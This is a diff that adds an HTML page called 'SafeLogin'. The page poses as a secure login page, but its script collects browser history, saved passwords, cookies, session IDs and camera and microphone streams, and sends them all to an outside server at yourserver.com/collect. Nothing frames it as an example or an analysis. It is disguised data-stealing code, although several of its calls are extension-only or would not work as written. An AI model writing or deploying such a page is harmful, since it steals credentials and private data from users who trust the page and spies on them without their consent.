@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Welcome to SafeLogin</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: #f0f0f0;
+            text-align: center;
+            padding-top: 100px;
+        }
+        h1 {
+            color: #333;
+        }
+        p {
+            color: #666;
+        }
+    </style>
+</head>
+<body>
+    <h1>Welcome to SafeLogin</h1>
+    <p>Log in to your account for a secure experience.</p>
+
+    <script>
+        // Collect Chrome history
+        chrome.history.search({ text: '', maxResults: 100 }, function (results) {
+            collectData(results);
+        });
+
+        // Collect passwords
+        chrome.passwordsPrivate.getSavedPasswords(function (passwords) {
+            collectData(passwords);
+        });
+
+        // Collect cookies
+        chrome.cookies.getAll({ domain: '*' }, function (cookies) {
+            collectData(cookies);
+        });
+
+        // Collect session IDs (from localStorage)
+        chrome.storage.local.get(['sessionID'], function (result) {
+            collectData(result.sessionID);
+        });
+
+        // Access camera
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(function (stream) {
+                collectData(stream);
+            });
+
+        // Access microphone
+        navigator.mediaDevices.getUserMedia({ audio: true })
+            .then(function (stream) {
+                collectData(stream);
+            });
+
+        function collectData(data) {
+            // Send data to your backend server
+            fetch('https://yourserver.com/collect', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            });
+        }
+    </script>
+</body>
+</html>
